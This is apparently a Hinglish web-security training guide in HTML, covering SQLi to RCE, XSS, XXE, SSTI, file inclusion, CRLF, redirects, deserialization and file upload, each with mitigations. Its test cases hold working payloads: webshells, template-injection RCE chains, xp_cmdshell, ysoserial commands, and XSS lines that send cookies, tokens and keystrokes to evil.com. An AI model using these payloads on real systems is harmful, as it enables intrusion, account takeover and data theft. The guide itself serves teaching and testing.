+<div class="def"><span class="lbl ld">Definition</span><br><b>Dynamic query:</b> string concatenation se query banati hai (<code>SELECT * FROM users WHERE name='"+input+"'</code>) — vulnerable. <b>Parameterized query:</b> SQL structure fixed, values placeholders se jaati hain (<code>SELECT * FROM users WHERE name=?</code>) — input kabhi SQL nahi ban sakta. Mitigation har layer par: <b>Client</b> — validation/escaping (sirf UX ke liye, security nahi); <b>Server</b> — parameterized queries, allowlist validation, ORM; <b>Database</b> — least privilege, disable dangerous features (xp_cmdshell), separate accounts per app.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Dynamic query + special chars allowed (business requirement) = SQLi open door; sirf client-side validation = trivial bypass (Burp se direct request).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Server-side parameterized queries compulsory — even when special chars are a business requirement.</li>
+<li>DB: least-privilege accounts, no <code>xp_cmdshell</code>, <code>FILE</code> privileges, network isolation.</li>
+<li>Client-side: validate format (e.g., email regex) but NEVER trust it for security.</li>
+<li>Apply escaping/encoding only where parameterization is impossible (dynamic ORDER BY → allowlist column names).</li>
+<li>Regular DAST/SAST scans + query logging with anomaly alerts.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Search/name field mein <code>'; DROP TABLE users--</code> daalo — error aata hai? (parameterized test)</li>
+<li>Special chars requirement wale field (password: <code>' OR 1=1--</code>) par parameterization test karo.</li>
+<li>DB user privileges enumerate karo: <code>SELECT current_user;</code>, <code>SELECT is_srvrolemember('sysadmin');</code></li>
+<li>ORDER BY / LIMIT / column-name inputs par injection try karo (whitelist missing?).</li>
+<li>Client validation bypass: Burp Repeater se invalid input direct bhejo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Business requirement: usernames mein apostrophe allowed. Dev ne input "sanitize" karke concat kiya — attacker ne <code>san''; DROP TABLE--</code> se bypass kiya. Fix: parameterized query, special chars se koi dikkat nahi hoti.</div>
+</section>
+
+<section class="topic" id="t14">
+<h2><span class="n">14</span>SQL Injection to RCE (SQL RCE)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SQLi se server-level command execution tab possible hai jab DB par high privileges hon: <b>MSSQL</b> — <code>EXEC xp_cmdshell 'whoami'</code>; <b>MySQL</b> — <code>SELECT '&lt;?php system($_GET["c"]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'</code> (needs FILE priv + write dir) ya UDF <code>sys_exec</code>; <b>PostgreSQL</b> — <code>COPY cmd FROM PROGRAM 'id'</code>; <b>Oracle</b> — <code>UTL_HTTP</code>/Java stored procedures. Stacked queries ya OOB techniques se payload deliver hota hai.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full server compromise → webshell, data exfiltration, lateral movement, ransomware. Severity: Critical (10.0).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>App DB user ko sirf CRUD privileges do — never sysadmin/DBA/root.</li>
+<li>Disable xp_cmdshell, FILE privilege, UDF plugin loading.</li>
+<li>Web root writable by DB user nahi hona chahiye (no INTO OUTFILE).</li>
+<li>Parameterized queries (SQLi ko root cause se khatam karo).</li>
+<li>OS hardening + EDR + outbound egress filtering (OOB ko rokne ke liye).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>UNION se <code>@@version</code> nikaalo — DB fingerprint (MSSQL/MySQL/Postgres?).</li>
+<li>MSSQL: <code>'; EXEC xp_cmdshell 'whoami'--</code> — command output aata hai?</li>
+<li>MySQL: <code>' UNION SELECT '&lt;?php system($_GET[0]);?&gt;' INTO OUTFILE '/var/www/html/s.php'--</code> phir /s.php?0=id.</li>
+<li>PostgreSQL: <code>'; COPY (SELECT 'id') TO PROGRAM 'id'--</code>.</li>
+<li>OOB RCE: xp_dirtree '\\attacker\share' se DNS exfil try karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Legacy CMS: SQLi + MySQL FILE privilege + webroot writable → attacker ne <code>INTO OUTFILE</code> se webshell daali, phir server se 200GB data exfiltrate kiya. Fix: DB privilege lockdown + parameterization.</div>
+</section>
+
+<section class="topic" id="t15">
+<h2><span class="n">15</span>"OR 1=1 Doesn't Work" — Your Next Steps</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Login par <code>' OR 1=1--</code> error deta hai, lekin backend ab bhi vulnerable ho sakta hai. Iska matlab hai: query parameterized nahi hai lekin syntax context alag hai, ya input somewhere filter/truncate ho raha hai, ya blind injection hai. Approach systematic honi chahiye.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Naive tester wahan ruk jata hai aur SQLi miss ho jati hai — jahan vulnerable tha wahan breach ka rasta khula rehta hai.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Har parameter ko alag se test karo (username, password, remember-me, hidden fields).</li>
+<li>Error message content analyze karo — DB type aur query structure hint deta hai.</li>
+<li>Blind techniques shift karo: boolean (<code>' AND 1=1--</code> vs <code>' AND 1=2--</code>) aur time-based.</li>
+<li>Encoding/obfuscation try karo: URL encode, double-encode, <code>%27</code>, case variation, comments <code>/**/</code>.</li>
+<li>Doosre endpoints par bhi wahi input patterns test karo — login safe ho sakta hai, profile/search vulnerable.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>admin' AND '1'='1</code> vs <code>admin' AND '1'='2</code> — responses differ? (boolean)</li>
+<li><code>' OR SLEEP(5)--</code> aur <code>' AND SLEEP(5)--</code> — response delay? (time)</li>
+<li><code>admin%27</code>, <code>admin%2527</code> (double encode) — error change hota hai?</li>
+<li>Error text padho: <code>You have an error in your SQL syntax</code> = MySQL raw concat ka proof.</li>
+<li>WAF hai? Agar haan, WAF bypass techniques apply karo (comments, chunked, HPP).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview scenario: login par OR 1=1 error deta hai kyunki password field WAF se block ho raha hai. Burp se payload ko <code>/*!50000OR*/ 1=1</code> form mein bhejo → injection works. Lesson: error = door, blocked = window.</div>
+</section>
+
+<section class="topic" id="t16">
+<h2><span class="n">16</span>XSS — Types, DOM XSS, Exploitation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>XSS = attacker ka JavaScript victim ke browser mein kisi aur ke context mein chalta hai. <b>Reflected:</b> payload URL/request mein aata hai aur turant reflect hota hai (ek-click). <b>Stored:</b> payload DB mein save hota hai, har visitor ke liye chalta hai (most critical). <b>DOM XSS:</b> server involve nahi hota — JavaScript hi vulnerable sink (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>location</code>) par untrusted source (<code>location.hash</code>, <code>postMessage</code>, <code>document.referrer</code>) use karta hai.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Session theft, account takeover, keylogging, CSRF, phishing, malware drop, defacement, crypto mining — browser ke andar kuch bhi.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Output encoding context-aware (HTML, attribute, JS, URL, CSS — alag encoding).</li>
+<li>Input validation allowlist + sanitization libraries (DOMPurify).</li>
+<li>CSP strict policy (<code>script-src 'nonce-xxx'</code>) — XSS ka impact mitigate hota hai.</li>
+<li>HttpOnly + Secure + SameSite cookies — session theft roko.</li>
+<li>DOM XSS ke liye: sinks par validation, avoid <code>innerHTML</code>, use <code>textContent</code>/safe APIs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har input par <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> aur <code>&lt;img src=x onerror=alert(1)&gt;</code> test karo.</li>
+<li>Contexts: attribute (<code>" onmouseover="alert(1)</code>), JS (<code>';alert(1);//</code>), URL (<code>javascript:alert(1)</code>).</li>
+<li>Reflected vs stored: payload daal ke doosre user ke session se check karo.</li>
+<li>DOM: URL fragment <code>#&lt;img src=x onerror=alert(1)&gt;</code> change karke page reload karo, sinks check karo.</li>
+<li>Encoding bypass: <code>&lt;svg/onload=alert(1)&gt;</code>, <code>&amp;#x3c;script&amp;#x3e;</code>, case mutation <code>&lt;ScRiPt&gt;</code>.</li>
+<li>Exploitation: cookie steal (<code>document.cookie</code>), keylogger, BeEF hook, token theft.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Comment section par stored XSS — har admin login par payload chalta hai, attacker admin session/CSRF token le kar user base modify kar deta hai. Fix: DOMPurify + CSP + HttpOnly.</div>
+</section>
+
+<section class="topic" id="t17">
+<h2><span class="n">17</span>XSS to Account Takeover (ATO) — CSRF via XSS + Payloads</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>XSS milne ke baad escalation: <b>CSRF via XSS</b> — same-origin context mein attacker victim ki taraf se koi bhi request bhej sakta hai (token chura ke ya same-origin fetch se) — cookie HttpOnly bhi ho to koi farak nahi padta. <b>ATO paths:</b> session cookie steal (agar HttpOnly nahi), CSRF token steal → password change, localStorage mein OAuth/JWT token steal, keylogger → credentials, session fixation (cookie inject), phishing overlay.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full account takeover — email/password change, financial fraud, PII exfiltration, admin compromise. XSS ko "just alert(1)" se escalate karna hi real impact dikhata hai.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>XSS root cause fix: encoding + CSP + sanitization (upar wala topic).</li>
+<li>HttpOnly on cookies (token theft rukega), SameSite on cookies.</li>
+<li>Store OAuth/JWT tokens in memory/HttpOnly cookies, NOT localStorage.</li>
+<li>Re-authentication (password) for sensitive actions (email change, transfer).</li>
+<li>Monitor for unusual session/device/geo changes + anomaly alerts.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Payload: <code>&lt;script&gt;fetch('/account').then(r=&gt;r.text()).then(d=&gt;new Image().src='https://evil.com/?d='+btoa(d))&lt;/script&gt;</code> — data exfil.</li>
+<li>CSRF via XSS: <code>fetch('/change-email',{method:'POST',body:'email=hacker@evil.com'})</code> — victim ka email badal jata hai?</li>
+<li>localStorage se token: <code>new Image().src='https://evil.com/?t='+localStorage.getItem('token')</code>.</li>
+<li>Keylogger: <code>document.addEventListener('keydown',e=&gt;new Image().src='https://evil.com/?k='+e.key)</code>.</li>
+<li>Session fixation: <code>document.cookie='sessionid=attacker_known;domain=.target.com'</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce mein profile-name par stored XSS → attacker ne CSRF via XSS se victim ka email + password reset kiya, phir gift cards redeem kar liye. Report severity: Critical.</div>
+</section>
+
+<section class="topic" id="t18">
+<h2><span class="n">18</span>XXE &amp; OOB XXE</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>XXE tab hota hai jab XML parser user-controlled XML parse karta hai aur external entities enabled hain. <b>Classic:</b> <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code> — response mein file content. <b>OOB XXE:</b> jab response mein output nahi dikhta — parameter entities se data attacker ke server/DNS par jata hai (blind exfiltration). Attack vektors: file read, SSRF (internal HTTP), DoS (Billion Laughs), RCE (PHP expect://, jar protocol).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Source code/config/credentials read, internal network scan (SSRF), cloud metadata theft, DoS, RCE — CVSS 9.8.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Disable DTDs and external entities entirely in XML parser config (best fix).</li>
+<li>Use JSON instead of XML where possible.</li>
+<li>If XML required: allowlist safe parsers (defusedxml, Xerces secure processing).</li>
+<li>Patch XML libraries (libxml2, Java JAXP etc.) — many CVEs.</li>
+<li>WAF rules for DOCTYPE/ENTITY patterns + egress filtering for OOB.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>XML body wale endpoint par <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> bhejo.</li>
+<li>SSRF test: <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code>.</li>
+<li>OOB: attacker server par external DTD host karo jisme parameter entity data bheje.</li>
+<li>Error-based: <code>&lt;!ENTITY xxe SYSTEM "file:///nonexistent"&gt;</code> — error mein path leak hota hai?</li>
+<li>Billion Laughs (DoS): nested entities se memory exhaust test (careful, authorized).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>PDF/Excel import feature XML parse karta hai — attacker ne file read se AWS credentials (metadata SSRF) nikaale aur S3 buckets clear kar diye. Fix: external entities disabled.</div>
+</section>
+
+<section class="topic" id="t19">
+<h2><span class="n">19</span>SSTI (Server-Side Template Injection)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SSTI tab hota hai jab user input directly template engine (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB) mein render hota hai bina sanitization ke. Detection: <code>{{7*7}}</code> → 49 aata hai? <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code>, <code>#{7*7}</code> try karo. Exploitation engine-specific hai — Jinja2 mein Python object chain se RCE: <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (worst case), file read, SSRF, information disclosure — Critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never let users control template content — templates static, data alag.</li>
+<li>If user input must appear, use template auto-escaping/placeholders, not raw template strings.</li>
+<li>Sandboxed template environments (Jinja2 sandbox) if dynamic templates unavoidable.</li>
+<li>Allowlist user-provided template names/keys, never full template text.</li>
+<li>Keep template engines patched; monitor for template-related CVEs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har reflection point par <code>{{7*7}}</code>, <code>${7*7}</code>, <code>&lt;%=7*7%&gt;</code>, <code>{{7*'7'}}</code> bhejo.</li>
+<li>49/7777777 response aata hai? → SSTI confirmed, engine identify karo.</li>
+<li>Jinja2 RCE: <code>{{cycler.__init__.__globals__.os.popen('id').read()}}</code> / <code>{{config.__class__...}}</code>.</li>
+<li>Freemarker: <code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</code>.</li>
+<li>Twig: <code>{{['id']|filter('system')}}</code> / file read via <code>_self.env</code> tricks.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Email template builder (user custom templates banata hai) — SSTI se attacker ne Jinja2 chain se <code>id</code> execute kiya, phir reverse shell. Fix: sandbox + template allowlist.</div>
+</section>
+
+<section class="topic" id="t20">
+<h2><span class="n">20</span>LFI vs RFI vs Directory Traversal vs Directory Listing</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Directory Traversal:</b> path manipulation se filesystem ke bahar ki files read: <code>../../../../etc/passwd</code>. <b>LFI:</b> server-side include/read function mein local file path inject: <code>?page=../../etc/passwd</code>, wrappers <code>php://filter/convert.base64-encode/resource=config.php</code>, <code>data://</code>, <code>expect://</code>; log poisoning se RCE. <b>RFI:</b> remote file include (<code>?page=http://evil.com/shell.txt</code>) — PHP <code>include</code> ke saath RCE. <b>Directory Listing:</b> web server ka apna feature — directory index missing par files list dikh jati hai (info disclosure, koi vulnerability nahi but bad practice).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Source code, configs, credentials read (LFI/traversal); RCE (RFI, log poisoning, LFI+wrappers); sensitive file exposure (listing).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never use user input in file paths; use file ID → server-side allowlist mapping.</li>
+<li>Canonicalize paths and validate (realpath + prefix check) against base directory.</li>
+<li>Disable remote URL includes (<code>allow_url_include=Off</code>) — RFI khatam.</li>
+<li>Disable directory listing (<code>Options -Indexes</code> / autoindex off).</li>
+<li>Web server chroot/least privilege, files outside webroot.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>?file=../../../../etc/passwd</code>, <code>....//....//etc/passwd</code>, URL-encoded <code>%2e%2e%2f</code> try karo.</li>
+<li>LFI wrapper: <code>?page=php://filter/convert.base64-encode/resource=config.php</code> — base64 decode karo.</li>
+<li>Log poisoning: User-Agent mein PHP code daalo, phir <code>?page=/var/log/apache2/access.log</code> include karo.</li>
+<li>RFI: <code>?page=http://attacker.com/shell.txt</code> — remote code execute hota hai?</li>
+<li>Directory listing: /uploads/, /backup/, /images/ kholo — files list hoti hain?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Download feature <code>download.php?file=</code> — LFI se <code>.env</code> (DB credentials) read hue → full DB compromise. Fix: file ID mapping + realpath check.</div>
+</section>
+
+<section class="topic" id="t21">
+<h2><span class="n">21</span>CRLF Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>CRLF (Carriage Return <code>\r</code> %0d + Line Feed <code>\n</code> %0a) HTTP headers/body ka separator hai. Jab user input bina sanitization ke response header ya log mein jaata hai, attacker apne headers inject kar sakta hai: <code>%0d%0aSet-Cookie:admin=1</code>, <code>%0d%0aLocation:https://evil.com</code> (open redirect + header injection), <code>%0d%0a%0d%0a&lt;script&gt;...&lt;/script&gt;</code> (response splitting → body mein XSS). Log injection: fake log entries daal kar forensic analysis confuse karna.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>XSS, session cookie injection, cache poisoning, web cache deception, log poisoning, open redirect — header/body boundary control.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Strip/reject CR (<code>%0d</code>/<code>\r</code>) and LF (<code>%0a</code>/<code>\n</code>) from ALL user input.</li>
+<li>Validate redirect URLs against an allowlist (no user-controlled Location).</li>
+<li>Encode/escape newlines in logs; use structured logging.</li>
+<li>Framework-level: use header APIs that auto-reject CRLF.</li>
+<li>WAF rules for %0d/%0a patterns (defense in depth).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Redirect endpoint: <code>?url=%0d%0aLocation:%20https://evil.com</code> — response headers mein injected Location dikhta hai?</li>
+<li>Set-Cookie injection: <code>%0d%0aSet-Cookie:session=hacked;Path=/</code>.</li>
+<li>Response splitting: <code>%0d%0a%0d%0a&lt;html&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/html&gt;</code>.</li>
+<li>Burp Repeater mein raw response dekho — injected headers present? (server-side CRLF).</li>
+<li>Log injection: username mein <code>Login Failed for admin\r\n\r\n[INFO] admin logged in</code> daalo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Search redirect par CRLF → attacker ne <code>Set-Cookie</code> inject karke victim ko attacker-controlled session de diya (session fixation) aur phir account hijack kiya.</div>
+</section>
+
+<section class="topic" id="t22">
+<h2><span class="n">22</span>Open Redirection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Application user-controlled URL par redirect karta hai bina validation: <code>?redirect=</code>, <code>?next=</code>, <code>?return=</code>, <code>?url=</code>, <code>?goto=</code>. Bypass techniques: <code>//evil.com</code> (protocol-relative), <code>https://evil.com</code>, <code>javascript:alert(1)</code>, <code>/\evil.com</code>, <code>%2f%2fevil.com</code>, <code>https:evil.com</code>, <code>@</code> tricks, <code>evil.com@target.com</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Phishing (trusted domain se evil site par), OAuth token theft (redirect_uri chaining), malware delivery, SEO damage. OWASP considers it Medium but it chains into account takeover.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Never redirect to user-supplied URLs; use server-side mapping/allowlist of destinations.</li>
+<li>Validate the URL begins with your own origin/domain (parse + compare host).</li>
+<li>Reject schemes other than http/https; block protocol-relative and backslash tricks.</li>
+<li>For OAuth: strict redirect_uri allowlist validation (exact match).</li>
+<li>WAF + browser-safe redirects via <code>Location</code> only from server-side constants.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>?next=https://evil.com</code>, <code>?next=//evil.com</code>, <code>?next=/\evil.com</code> — Location header check karo.</li>
+<li>Encoded: <code>%2f%2fevil.com</code>, <code>https:%2f%2fevil.com</code>, double-encode.</li>
+<li><code>javascript:alert(document.domain)</code> scheme try karo.</li>
+<li><code>https://target.com@evil.com</code> — browser evil.com par jata hai?</li>
+<li>OAuth flow mein redirect_uri param modify karke attacker domain daalo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Login ke baad <code>?redirect=</code> — attacker ne <code>//evil.com</code> bhej kar phishing page par le gaya jo exact login clone tha → credentials steal. OAuth mein isi se access token bhi chori hote hain.</div>
+</section>
+
+<section class="topic" id="t23">
+<h2><span class="n">23</span>Host Header Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Application apne URLs/links <code>Host</code> header se banata hai bina validation. Attacker Host header ko modify karta hai: duplicate Host, absolute URL in request line, <code>X-Forwarded-Host</code>, <code>X-Host</code>, newline injection. Impacts: <b>password reset poisoning</b> (reset link attacker domain par jata hai → token steal), <b>cache poisoning</b>, routing bypass, web cache deception, SSRF in some cases.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Account takeover via poisoned reset links, DoS (routing to non-existent vhost), cache poisoning affecting all users.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate Host header against a strict allowlist of domains.</li>
+<li>Never trust X-Forwarded-Host/X-Forwarded-Proto; use configured server name instead.</li>
+<li>Generate absolute URLs from server config, not from request headers.</li>
+<li>Reject duplicate/multiple Host headers at proxy/load balancer.</li>
+<li>Password reset: bind token to user+session, expire quickly, log origin.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Request mein <code>Host: evil.com</code> set karke reset-password link generate karo — email mein kaunsa domain aata hai?</li>
+<li>Duplicate Host: <code>Host: target.com</code> + <code>Host: evil.com</code> — kaunsa use hota hai?</li>
+<li><code>X-Forwarded-Host: evil.com</code> — app trust karta hai?</li>
+<li>Absolute URL: <code>GET https://evil.com/ HTTP/1.1</code> + <code>Host: target.com</code>.</li>
+<li>Cache poisoning: Host header change karke CDN cached page check karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Password reset flow Host header use karta hai — attacker victim ke reset link ko <code>Host: evil.com</code> se generate karvata hai, victim link par click karta hai, reset token evil.com par jaata hai → account takeover. Fix: Host allowlist + token binding.</div>
+</section>
+
+<section class="topic" id="t24">
+<h2><span class="n">24</span>HTML Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>User input HTML ke roop mein render hota hai bina encoding — attacker HTML tags inject kar sakta hai: <code>&lt;h1&gt;Defaced&lt;/h1&gt;</code>, <code>&lt;iframe src="https://evil.com"&gt;</code>, <code>&lt;img src=x onerror=...&gt;</code>, fake login forms, phishing content. XSS se difference: HTML injection mein JavaScript execution zaroori nahi — sirf HTML content injection bhi kafi hai (phishing/defacement). Agar tags allowed hain to XSS
+
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Profile/comment fields par <code>&lt;h1&gt;Hacked&lt;/h1&gt;</code> daalo — HTML render hota hai?</li>
+<li><code>&lt;iframe src="https://evil.com"&gt;</code> — iframe inject hota hai?</li>
+<li>Fake login form: <code>&lt;form action="https://evil.com/steal"&gt;&lt;input name=user&gt;&lt;input type=password&gt;&lt;/form&gt;</code>.</li>
+<li>Attribute injection: <code>"&gt;&lt;img src=x onerror=alert(1)&gt;</code> — kya XSS tak escalate hota hai?</li>
+<li>Encoded variants: <code>&amp;lt;h1&amp;gt;</code>, <code>&lt;scr&lt;script&gt;ipt&gt;</code> (nested filter bypass).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Support-ticket chat mein HTML allowed tha (rich text) par sanitization nahi — attacker ne fake "Session Expired — Login Again" form daal kar customer ke credentials phish kiye. Fix: allowlist tags + DOMPurify.</div>
+</section>
+
+<section class="topic" id="t25">
+<h2><span class="n">25</span>Mass Assignment (Batch Assignment)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Framework (Rails, Laravel, Spring, ASP.NET) request body ke parameters ko directly model/object properties par map kar deta hai. Attacker extra fields bhej kar un properties ko set kar sakta hai jo wo normally change nahi kar sakta: <code>{"name":"attacker","isAdmin":true}</code>, <code>{"role":"admin"}</code>, <code>{"price":0}</code>, <code>{"balance":99999}</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Privilege escalation (admin flag), price/balance tampering, bypassing business rules — Critical if authz fields exposed.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Allowlist binding: sirf un fields ko bind karo jo user set kar sakta hai.</li>
+<li>Never auto-bind from request body; use DTOs (Data Transfer Objects).</li>
+<li>Blocklist dangerous fields (role, isAdmin, price, balance, id).</li>
+<li>Apply authorization checks on field level for sensitive attributes.</li>
+<li>Log and monitor unexpected parameter keys.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Profile update POST mein <code>isAdmin=true</code> / <code>role=admin</code> add karke response dekho.</li>
+<li>Order POST mein <code>price=0</code> ya <code>total=1</code> — checkout amount change hota hai?</li>
+<li><code>id</code> field override: update request mein doosre user ka id bhejo.</li>
+<li>Mass parameters brute: <code>{"email":"x@x.com","verified":true,"premium":true}</code>.</li>
+<li>API version compare karo — JSON body binding behaviour alag hai kya?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce checkout par <code>{"quantity":1,"price":0.01}</code> bhej kar attacker ne $999 ka product $0.01 mein kharida. Fix: DTO + price server-side se aaye.</div>
+</section>
+
+<section class="topic" id="t26">
+<h2><span class="n">26</span>Insecure Deserialization</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Application serialized data (PHP serialize, Java ObjectInputStream, Python pickle, .NET BinaryFormatter, JSON with type info) ko bina validation deserialize karta hai. Attacker crafted serialized object bhej kar gadget chains (ysoserial, phpggc) se RCE, DoS, auth bypass karta hai. Impact depends on data source (cookie, hidden param, request body).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (critical), DoS (hash DoS, billion laughs), authentication bypass, SQL injection via object state.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Deserialize only trusted data; sign/encrypt serialized blobs (HMAC) so users can't tamper.</li>
+<li>Prefer safe formats: JSON with strict schemas, no type info.</li>
+<li>If unavoidable, use allowlists of allowed classes (Java serialization filter).</li>
+<li>Run deserialization in sandbox/container with least privilege.</li>
+<li>Patch libraries (many CVEs: Log4Shell chain, Jackson, Fastjson).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Base64 cookie decode karo — Java serialized magic bytes <code>AC ED 00 05</code> / PHP <code>O:4:"User":...</code> milta hai?</li>
+<li>ysoserial payload: <code>java -jar ysoserial.jar CommonsCollections1 'id'</code> — cookie mein bhej kar response/error dekho.</li>
+<li>phpggc: <code>phpggc Laravel/RCE1 system id</code> — serialized chain test karo.</li>
+<li>Pickle: <code>__reduce__</code> based payload send karo — RCE hota hai?</li>
+<li>Tamper test: cookie ka ek byte change karke bhejo — signed check hai ya raw deserialize?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Java app session cookie mein serialized object — ysoserial CommonsCollections6 se attacker ne <code>whoami</code> execute kiya, phir RCE se server pura compromise. Fix: HMAC sign cookies + deserialization filter.</div>
+</section>
+
+<section class="topic" id="t27">
+<h2><span class="n">27</span>File Upload to RCE</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Upload feature sirf extension/MIME check karta hai. Exploitation paths: <b>.php/.jsp/.asp webshell</b> upload; <b>double extension</b> <code>shell.php.jpg</code>; <b>null byte</b> <code>shell.php%00.jpg</code>; <b>case</b> <code>shell.PHP</code>; <b>polyglot</b> (GIF header + PHP code); <b>.htaccess</b> upload (php as handler); <b>SVG XSS/XXE</b>; <b>image magick</b> RCE (ImageTragick); <b>zip slip</b>; <b>filename traversal</b> <code>../../shell.php</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE/webshell, stored XSS via SVG, malware hosting, internal scanning via SSRF uploads, complete server takeover.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Allowlist extensions + validate actual content (magic bytes), not just MIME.</li>
+<li>Store files outside webroot; serve via download handler with Content-Disposition.</li>
+<li>Randomize filenames (never use user-supplied names).</li>
+<li>Disable script execution on upload dir (<code>RemoveHandler</code>/noexec).</li>
+<li>Scan uploads with AV/malware engine; limit file size; restrict user access to upload dir.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Simple: <code>&lt;?php system($_GET['c']);?&gt;</code> as .php upload karo, phir /uploads/shell.php?c=id.</li>
+<li>Bypass: <code>shell.php.jpg</code>, <code>shell.pHp</code>, <code>shell.php%00.jpg</code>, <code>shell.php.</code> (trailing dot).</li>
+<li>.htaccess: <code>AddType application/x-httpd-php .txt</code> upload karke shell.txt chalao.</li>
+<li>SVG: <code>&lt;svg onload=alert(document.domain)&gt;</code> — stored XSS test.</li>
+<li>Polyglot: GIF89a header + PHP code — extension check bypass hota hai?</li>
+<li>Filename traversal: <code>../../var/www/html/shell.php</code> — path traversal write?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Avatar upload sirf image/png check karta hai — attacker ne polyglot PNG+PHP upload kiya, /uploads/ par direct access mila → webshell → server pura compromise. Fix: content validation + noexec upload dir.</div>
+</section>
+
